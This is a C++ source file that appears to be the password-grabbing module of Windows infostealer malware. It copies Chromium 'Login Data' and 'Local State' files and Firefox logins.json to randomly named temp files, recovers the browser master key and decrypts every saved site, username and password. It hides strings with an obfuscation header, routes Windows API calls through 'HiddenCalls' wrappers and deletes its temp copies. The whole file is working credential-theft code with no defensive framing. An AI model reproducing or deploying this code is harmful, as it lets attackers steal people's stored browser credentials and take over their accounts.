#include "Passwords.hpp"
#include "Browsers_EntryPoint.hpp"
#include "winapi_structs.hpp"
#include "Crypto.hpp"
#include "os.hpp"
#include "nss3.hpp"
#include <vector>
#include "json.hpp"
#include <sqlite3.h>
#include <filesystem>
#include "obfusheader.h"
#include "Helper.h"

namespace fs = std::filesystem;

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Shell32.lib")

std::string wstring_to_string(const std::wstring& wstr) {
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string str(size, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &str[0], size, NULL, NULL);
    return str;
}

std::vector<Password> Browser::GetPasswords() {
    DEBUG_PRINT(L"Chromium Passwords Called");

    std::vector<Password> pswds;

    for (const auto& Chromium : chromiumBrowsers) {
        fs::path pws = fs::path(Chromium.profileLocation) / OBF("Login Data");
        fs::path LocalState = fs::path(Chromium.browserRoot) / OBF("Local State");

        if (!fs::exists(pws) || !fs::exists(LocalState)) {
            continue;
        }

        std::string passwords_str = TEMP + OBF("\\") + RandomString(7) + OBF(".db");
        const char* passwords = passwords_str.c_str();

        std::string local_state_str = TEMP + OBF("\\") + RandomString(7) + OBF(".db");
        const char* local_state = local_state_str.c_str();


        try {
            copy_file(LocalState, local_state, fs::copy_options::overwrite_existing);
            copy_file(pws, passwords, fs::copy_options::overwrite_existing);
        }
        catch (fs::filesystem_error& e) {
            continue;
        }

        sqlite3* db = nullptr;
        sqlite3_stmt* stmt = nullptr;

        HANDLE hFile = HiddenCalls::CreateFileA(
            passwords, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            continue;
        }

        DWORD fileSize = HiddenCalls::GetFileSize(hFile, nullptr);
        if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        HANDLE hMap = HiddenCalls::CreateFileMappingA(hFile, nullptr, PAGE_READONLY, 0, fileSize, nullptr);
        if (!hMap) {
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        LPVOID mappedFile = HiddenCalls::MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, fileSize);
        if (!mappedFile) {
            HiddenCalls::CloseHandle(hMap);
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        std::string master_key = Crypto::GetMasterKey(local_state);
        std::string tempdb = TEMP + "\\" + RandomString(7) + ".db";     // Idk why tf you decided to copy the already copied passwords db again but who am i to judge ¯\(ツ)/¯

        try {
            fs::copy_file(passwords, tempdb, fs::copy_options::overwrite_existing);
        }
        catch (fs::filesystem_error&) {
            HiddenCalls::UnmapViewOfFile(mappedFile);
            HiddenCalls::CloseHandle(hMap);
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        if (sqlite3_open(tempdb.c_str(), &db) != SQLITE_OK) {
            sqlite3_close(db);
            HiddenCalls::UnmapViewOfFile(mappedFile);
            HiddenCalls::CloseHandle(hMap);
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        std::string query = OBF("SELECT origin_url, username_value, password_value FROM logins");
        if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
            sqlite3_close(db);
            HiddenCalls::UnmapViewOfFile(mappedFile);
            HiddenCalls::CloseHandle(hMap);
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Password password;
            password.site = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
            if (password.site.empty()) continue;

            password.username = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));
            if (password.username.empty()) continue;

            const int size = sqlite3_column_bytes(stmt, 2);
            if (size <= 0) continue;

            const auto* encrypted_password = static_cast<const unsigned char*>(sqlite3_column_blob(stmt, 2));
            if (encrypted_password == nullptr) continue;

            std::vector<unsigned char> encrypted_password_vec(encrypted_password, encrypted_password + size);
            password.password = Crypto::AES256GCMDecrypt(master_key, encrypted_password_vec);

            if (!password.username.empty() && !password.password.empty()) {
                password.browsername = wstring_to_string(Chromium.profileLocation);
                pswds.push_back(password);
            }
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);
        HiddenCalls::UnmapViewOfFile(mappedFile);
        HiddenCalls::CloseHandle(hMap);
        HiddenCalls::CloseHandle(hFile);
        fs::remove(tempdb); // Wow im proud of you. Atleast once you deleted the temp db

        try {
            fs::remove(local_state);
            fs::remove(passwords);
        }
        catch (...) {}
    }
    for (const auto& Gecko : geckoBrowsers) {
        fs::path pws = fs::path(Gecko.profileLocation) / OBF("logins.json");

        if (!fs::exists(pws)) {
            continue;
        }

        std::string passwords = TEMP + OBF("\\") + RandomString(7) + OBF(".json");

        try {
            copy_file(pws, passwords, fs::copy_options::overwrite_existing);
        }
        catch (fs::filesystem_error& e) {
            continue;
        }

        std::string profile = passwords.substr(0, passwords.find_last_of("\\"));
        std::string jsonContent = OS::ReadFile(passwords);

        try {
            nlohmann::json j = nlohmann::json::parse(jsonContent);

            for (auto& password : j[OBF("logins")]) {
                Password pswd;
                pswd.site = password[OBF("hostname")].get<std::string>();
                pswd.username = NSS::PK11SDR_Decrypt(profile, password[OBF("encryptedUsername")].get<std::string>());
                pswd.password = NSS::PK11SDR_Decrypt(profile, password[OBF("encryptedPassword")].get<std::string>());

                if (pswd.username.empty() || pswd.password.empty()) continue;
                pswd.browsername = wstring_to_string(Gecko.profileLocation);
                pswds.push_back(pswd);
            }
        }
        catch (const std::exception&) {
        }

        try {
            fs::remove(passwords);
        }
        catch (...) {}
    }

    DEBUG_PRINT(L"Password Grabber Passed");


    return pswds;
}
